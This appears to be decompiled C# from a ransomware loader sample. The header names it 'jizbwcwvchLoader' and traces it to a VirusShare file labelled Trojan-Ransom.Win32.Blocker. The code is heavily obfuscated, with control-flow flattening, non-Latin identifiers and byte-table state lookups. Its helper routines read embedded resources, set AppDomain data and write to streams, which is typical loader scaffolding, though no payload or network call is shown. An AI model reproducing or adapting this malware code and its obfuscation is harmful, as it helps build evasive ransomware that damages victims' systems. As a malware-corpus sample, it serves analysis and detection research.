// Decompiled with JetBrains decompiler
// Type: Ⴍ.ႷႳ
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Ⴍ
{
  internal sealed class ႷႳ : ApplicationException
  {
    public ႷႳ()
      : base(\u000E.Ⴓ(2088295864, 6, 9L, (byte) 2))
    {
      ႷႣ.Ⴅ();
    }

    static ႷႳ() => \u0006.Ⴀ();

    internal static string Ⴐ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 740;
label_4:
      int num2 = num1;
      int num3 = (num2 * num2 + num1) % 2 == 0 ? 6 : (int) ⴍ[263] - 151;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 3:
            num3 = (int) ⴍ[469] - 201;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 4:
            goto label_7;
          case 6:
            ႷႳ.Ⴐ();
            num3 = (int) ⴍ[123];
            continue;
          case 7:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴐ);
            num3 = (int) ⴗ[82];
            continue;
        }
      }
label_7:
      return (string) null;
    }

    internal static Type Ⴄ()
    {
label_3:
      int num1 = 1220;
label_4:
      int num2 = num1;
      int num3 = num2 * num2;
      int num4 = num1 + num3;
label_5:
      int num5 = 2;
      while (true)
      {
        switch (num5)
        {
          case 0:
          case 5:
            goto label_8;
          case 1:
            goto label_3;
          case 2:
            int num6 = num4;
            Ⴍ.Ⴜ.Ⴗ[65] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[65] & (int) Ⴍ.Ⴜ.Ⴗ[77] & 182);
            num5 = num6 % 2 != 0 ? 5 : 4;
            continue;
          case 3:
            goto label_5;
          case 4:
            ႷႳ.Ⴄ();
            num5 = 5;
            continue;
          case 6:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴄ);
            num5 = 1;
            continue;
        }
      }
label_8:
      return typeof (\u000E);
    }

    internal static string Ⴃ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      \u0006.ႭႭ(356, 'ǣ').SetData(\u000E.Ⴓ(2088295578, 5, 2L, (byte) 20), (object) null);
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴃ);
            num = (int) ⴗ[24] - 92;
            continue;
        }
      }
label_4:
      return (string) null;
    }

    internal static object Ⴍ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(317, 'Ƶ'), \u000E.Ⴓ(2088295581, 2, 6L, (byte) 23), 828, (short) 892);
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? 8 : 42;
            continue;
          case 1:
          case 10:
          case 43:
            goto label_34;
          case 2:
            num1 = (byte) 33 == ((byte[]) obj)[index] ? (int) ⴗ[85] : 30;
            continue;
          case 3:
            num1 = (byte) 106 == (obj as byte[])[index] ? (int) ⴍ[154] - 65 : (int) ⴗ[60] - 99;
            continue;
          case 4:
            ႷႣ.Ⴀ();
            num1 = 12;
            continue;
          case 5:
            num1 = (obj as byte[])[index] < (byte) 208 ? 35 : 27;
            continue;
          case 6:
            ႷႣ.Ⴀ();
            num1 = 11;
            continue;
          case 7:
            \u0003.Ⴄ();
            num1 = 21;
            continue;
          case 8:
            goto label_4;
          case 9:
            ++index;
            num1 = 36;
            continue;
          case 11:
            ++index;
            num1 = (int) ⴗ[36] - 119;
            continue;
          case 12:
            goto label_43;
          case 13:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? 21 : (int) ⴍ[272];
            continue;
          case 14:
            goto label_14;
          case 15:
            num1 = (obj as byte[])[index] < (byte) 232 ? 10 : 34;
            continue;
          case 16:
            ႷႳ.Ⴐ();
            num1 = (int) ⴍ[17] - 49;
            continue;
          case 17:
            num1 = (obj as byte[])[index] < (byte) 248 ? 19 : 26;
            continue;
          case 18:
            ++index;
            num1 = 44;
            continue;
          case 19:
            goto label_19;
          case 20:
            goto label_3;
          case 21:
            ++index;
            num1 = (int) ⴍ[91];
            continue;
          case 23:
            ++index;
            num1 = 5;
            continue;
          case 24:
            num1 = (byte) 218 == ((byte[]) obj)[index] ? (int) ⴗ[159] - 60 : 16;
            continue;
          case 25:
            goto label_24;
          case 26:
            num1 = (byte) 248 == ((byte[]) obj)[index] ? 29 : (int) ⴍ[174] + 37;
            continue;
          case 27:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? 11 : 6;
            continue;
          case 28:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? 25 : 24;
            continue;
          case 29:
            ++index;
            num1 = 28;
            continue;
          case 30:
            ႷႰ.Ⴐ();
            num1 = (int) ⴍ[81] - 195;
            continue;
          case 31:
            goto label_39;
          case 32:
            num1 = (obj as byte[])[index] < (byte) 29 ? 14 : (int) ⴗ[4];
            continue;
          case 33:
            \u000E.Ⴄ();
            num1 = 9;
            continue;
          case 34:
            num1 = (byte) 232 == (obj as byte[])[index] ? 9 : (int) ⴗ[89] - 171;
            continue;
          case 35:
            goto label_9;
          case 36:
            num1 = (obj as byte[])[index] < (byte) 106 ? 31 : (int) ⴗ[11] - 107;
            continue;
          case 37:
          case 44:
            num1 = ((byte[]) obj)[index] < (byte) 33 ? (int) ⴍ[12] - 115 : 2;
            continue;
          case 38:
            ++index;
            num1 = 15;
            continue;
          case 39:
            \u0003.Ⴀ();
            num1 = 29;
            continue;
          case 40:
            ႷႣ.Ⴀ();
            num1 = 23;
            continue;
          case 41:
            goto label_29;
          case 42:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 23 : (int) ⴗ[165] - 185;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴍ);
            num1 = 20;
            continue;
        }
      }
label_4:
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_29:
      return (object) null;
label_34:
      return (object) null;
label_39:
      return (object) null;
label_43:
      int num2 = index + 1;
      return (object) null;
    }

    internal static byte Ⴗ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(55, '\u00BE'), \u000E.Ⴓ(2088295576, 7, 7L, (byte) 1), 649, (short) 712);
      int num1 = 23;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 218 == ((byte[]) obj)[index] ? 32 : (int) ⴗ[114] - 195;
            continue;
          case 1:
            ++index;
            num1 = 18;
            continue;
          case 2:
            ႷႳ.Ⴄ();
            num1 = (int) ⴗ[14] - 46;
            continue;
          case 3:
            ႷႳ.Ⴐ();
            num1 = (int) ⴍ[272];
            continue;
          case 4:
            goto label_19;
          case 5:
            \u0003.Ⴄ();
            num1 = 6;
            continue;
          case 6:
          case 25:
            ++index;
            num1 = (int) ⴍ[201] - 124;
            continue;
          case 7:
            ++index;
            num1 = 20;
            continue;
          case 8:
            goto label_3;
          case 9:
            num1 = (byte) 29 == (obj as byte[])[index] ? 1 : 31;
            continue;
          case 10:
            num1 = (obj as byte[])[index] < (byte) 218 ? 36 : 0;
            continue;
          case 11:
            goto label_29;
          case 12:
            num1 = (byte) 33 == ((byte[]) obj)[index] ? (int) ⴗ[72] : (int) ⴍ[97] - 137;
            continue;
          case 13:
            num1 = (obj as byte[])[index] < (byte) 33 ? 11 : 12;
            continue;
          case 14:
            num1 = (obj as byte[])[index] < (byte) 29 ? 38 : 9;
            continue;
          case 15:
            num1 = (byte) 208 == (obj as byte[])[index] ? (int) ⴍ[112] / 2 : (int) ⴍ[571] - 119;
            continue;
          case 16:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 35 : 2;
            continue;
          case 17:
          case 31:
            \u0006.Ⴐ();
            num1 = 1;
            continue;
          case 18:
            num1 = (obj as byte[])[index] < (byte) 248 ? (int) ⴗ[159] - 74 : (int) ⴍ[437];
            continue;
          case 20:
            num1 = ((byte[]) obj)[index] < (byte) 232 ? (int) ⴍ[546] - 35 : (int) ⴗ[116];
            continue;
          case 21:
            ႷႣ.Ⴀ();
            num1 = (int) ⴍ[141];
            continue;
          case 22:
            goto label_4;
          case 23:
            num1 = (obj as byte[])[index] < (byte) 8 ? 22 : (int) ⴗ[99] - 91;
            continue;
          case 24:
          case 32:
            ++index;
            num1 = 13;
            continue;
          case 26:
            goto label_9;
          case 27:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? 26 : 15;
            continue;
          case 28:
            num1 = (byte) 232 == ((byte[]) obj)[index] ? 39 : 30;
            continue;
          case 29:
            goto label_34;
          case 30:
            goto label_37;
          case 33:
            num1 = (byte) 248 == ((byte[]) obj)[index] ? 37 : 21;
            continue;
          case 34:
            ႷႳ.Ⴐ();
            num1 = 32;
            continue;
          case 35:
            ++index;
            num1 = 27;
            continue;
          case 36:
            goto label_24;
          case 37:
            ++index;
            num1 = 10;
            continue;
          case 38:
            goto label_14;
          case 39:
            goto label_38;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴗ);
            num1 = (int) ⴗ[170] - (int) ⴗ[149];
            continue;
        }
      }
label_4:
      return 15;
label_9:
      return 18;
label_14:
      return 12;
label_19:
      return 28;
label_24:
      return 21;
label_29:
      return 5;
label_34:
      return 29;
label_37:
      \u0006.Ⴅ();
label_38:
      int num2 = index + 1;
      return 19;
    }

    internal static string Ⴈ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(201, 'C'), \u000E.Ⴓ(2088295580, 3, 15L, (byte) 25), 1, (short) 67);
      int num1 = 10;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++index;
            num1 = (int) ⴍ[107];
            continue;
          case 1:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? 19 : 26;
            continue;
          case 2:
            goto label_9;
          case 3:
          case 6:
            ++index;
            num1 = (int) ⴍ[157] - 198;
            continue;
          case 4:
            ႷႰ.Ⴐ();
            num1 = (int) ⴗ[12] - 71;
            continue;
          case 5:
            \u000E.Ⴄ();
            num1 = 16;
            continue;
          case 7:
          case 24:
            goto label_14;
          case 8:
            num1 = (byte) 8 == (obj as byte[])[index] ? 3 : (int) ⴍ[369];
            continue;
          case 9:
            goto label_24;
          case 10:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? (int) ⴍ[397] - 138 : (int) ⴗ[48];
            continue;
          case 11:
            ႷႰ.Ⴐ();
            num1 = (int) ⴗ[59] - 26;
            continue;
          case 12:
            goto label_3;
          case 13:
          case 14:
            ++index;
            num1 = (int) ⴍ[339] / 9;
            continue;
          case 15:
            goto label_4;
          case 16:
            goto label_28;
          case 17:
            \u0006.Ⴐ();
            num1 = 14;
            continue;
          case 18:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? 2 : (int) ⴗ[82];
            continue;
          case 19:
            int num2 = index;
            Ⴍ.Ⴜ.Ⴗ[49] = \u0003\u2002.Ⴍ[364];
            index = num2 + 1;
            num1 = (int) ⴍ[347] - 93;
            continue;
          case 20:
            num1 = (byte) 248 == (obj as byte[])[index] ? 14 : (int) ⴍ[91];
            continue;
          case 21:
            num1 = ((byte[]) obj)[index] < (byte) 248 ? (int) ⴍ[388] - 25 : 20;
            continue;
          case 22:
            goto label_19;
          case 23:
            num1 = ((byte[]) obj)[index] < (byte) 29 ? (int) ⴍ[47] - (int) ⴍ[143] : 27;
            continue;
          case 25:
            num1 = (obj as byte[])[index] < (byte) 218 ? 9 : 29;
            continue;
          case 26:
            \u0006.Ⴅ();
            goto case 19;
          case 27:
            num1 = (byte) 29 == (obj as byte[])[index] ? 0 : (int) ⴗ[28] - 173;
            continue;
          case 29:
            num1 = (byte) 218 == (obj as byte[])[index] ? (int) ⴍ[105] : (int) ⴍ[90] - 118;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴈ);
            num1 = 12;
            continue;
        }
      }
label_4:
      return (string) null;
label_9:
      return (string) null;
label_14:
      return (string) null;
label_19:
      return (string) null;
label_24:
      return (string) null;
label_28:
      int num3 = index + 1;
      return (string) null;
    }

    internal static void Ⴓ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] char obj5)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int num1 = 4;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++num2;
            int num3 = (int) obj5;
            num1 = (num3 * num3 + (int) obj5) % 2 == 0 ? 7 : (int) ⴗ[82] * 6;
            continue;
          case 1:
            obj0.Write(obj1, obj2, obj3);
            goto case 0;
          case 2:
          case 9:
            num1 = (int) ⴍ[458] - 138;
            continue;
          case 3:
          case 10:
            obj0.Write(obj1, obj2, obj3);
            goto case 2;
          case 5:
            num1 = 0;
            continue;
          case 6:
            num1 = 8;
            continue;
          case 7:
            goto label_14;
          case 8:
            int num4;
            switch (((int) obj5 ^ obj4) - 85 ^ num2)
            {
              case 0:
                num4 = (int) ⴗ[33] - 65;
                break;
              case 1:
                num4 = 1;
                break;
              default:
                num4 = (int) ⴗ[108] - (int) ⴗ[59];
                break;
            }
            num1 = num4;
            continue;
          default:
            num2 = 0;
            num1 = 8;
            continue;
        }
      }
label_14:;
    }

    internal static Assembly Ⴅ([In] Type obj0, [In] char obj1, [In] short obj2)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[111] - 139;
      _Assembly assembly;
      while (true)
      {
        switch (num2)
        {
          case 0:
            assembly = (_Assembly) obj0.Assembly;
            goto case 1;
          case 1:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? (int) ⴍ[506] - 198 : 4;
            continue;
          case 2:
          case 3:
          case 4:
            num2 = 0;
            continue;
          case 5:
            goto label_3;
          case 7:
            goto label_7;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴅ);
            num2 = 5;
            continue;
        }
      }
label_7:
      return (Assembly) assembly;
    }

    internal static void Ⴀ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] char obj4)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      int num1 = 7;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++num2;
            num3 = 878;
            goto case 5;
          case 1:
          case 4:
            int num4;
            switch (((int) obj4 ^ obj3) - 40 ^ num2)
            {
              case 0:
                num4 = (int) ⴍ[300] - (int) ⴍ[98];
                break;
              case 1:
                num4 = (int) ⴗ[120] - (int) ⴗ[82];
                break;
              default:
                num4 = (int) ⴍ[123];
                break;
            }
            num1 = num4;
            continue;
          case 2:
            num1 = (int) ⴗ[76] - 220;
            continue;
          case 3:
            obj0.SetData(obj1, obj2);
            num1 = (int) ⴍ[86] - 59;
            continue;
          case 5:
            int num5 = 213;
            num1 = 439 < num3 / 2 - num5 ? (int) ⴗ[123] - 118 : 8;
            continue;
          case 6:
          case 9:
            obj0.SetData(obj1, obj2);
            goto case 0;
          case 8:
            goto label_13;
          default:
            num2 = 0;
            num1 = 4;
            continue;
        }
      }
label_13:;
    }

    internal static string[] Ⴜ([In] Assembly obj0, [In] short obj1, [In] short obj2)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 3;
      object manifestResourceNames;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_11;
          case 1:
          case 7:
            int num4;
            if (1782 <= 891 - num3 * 2)
              num4 = 8;
            else
              goto label_9;
label_8:
            num2 = num4;
            continue;
label_9:
            int num5 = (int) ⴍ[547];
            int num6 = (int) ⴍ[397];
            \u0003\u2002.Ⴍ[334] = (byte) ((int) \u0003\u2002.Ⴍ[334] & (int) obj1 & 121);
            num4 = num5 - num6;
            goto label_8;
          case 3:
            manifestResourceNames = (object) obj0.GetManifestResourceNames();
            goto case 4;
          case 4:
            ++num1;
            num3 = 634;
            num2 = 7;
            continue;
          case 6:
            goto label_3;
          case 8:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴜ);
            num2 = (int) ⴗ[79] - 181;
            continue;
        }
      }
label_11:
      return manifestResourceNames as string[];
    }

    internal static void ႣႭ([In] ref GCHandle obj0, [In] short obj1, [In] short obj2)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int num1 = 7;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            num1 = (int) ⴍ[7] * 3;
            continue;
          case 1:
            ++num2;
            num3 = 5;
            num1 = 4;
            continue;
          case 2:
            goto label_7;
          case 3:
            obj0.Free();
            goto case 1;
          case 4:
            num1 = 92 > 46 - num3 * 2 ? (int) ⴗ[67] : 5;
            continue;
          case 6:
            goto label_8;
          default:
            num2 = 0;
            num1 = (int) ⴗ[12] - 68;
            continue;
        }
      }
label_7:
      return;
label_8:;
    }

    internal static int ႣႣ([In] string obj0, [In] string obj1, [In] bool obj2, [In] char obj3, [In] int obj4)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[79] - 184;
      int num3;
      int num4;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 8:
            num4 = 202;
            num5 = 756;
            goto case 7;
          case 2:
          case 5:
            goto label_8;
          case 3:
            num3 = string.Compare(obj0, obj1, obj2);
            ++num1;
            num2 = 8;
            continue;
          case 4:
            num2 = (int) ⴍ[120] - 118;
            continue;
          case 6:
            goto label_3;
          case 7:
            num2 = 6048 > num5 - num4 * 8 ? (int) ⴗ[122] - 155 : (int) ⴍ[146];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႣႣ);
            num2 = (int) ⴗ[35] - 14;
            continue;
        }
      }
label_8:
      return num3;
    }

    internal static void ႣႰ([In] Stream obj0, [In] int obj1, [In] short obj2)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int num1 = 5;
      int num2;
      int num3;
      int num4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            obj0.Close();
            ++num2;
            num3 = 1332;
            num1 = (int) ⴍ[130] - 239;
            continue;
          case 2:
            num4 = 273;
            goto case 6;
          case 4:
            goto label_6;
          case 6:
            num1 = 333 < num3 / 4 - num4 ? 3 : 4;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴗ[130] - 181;
            continue;
        }
      }
label_6:;
    }
  }
}
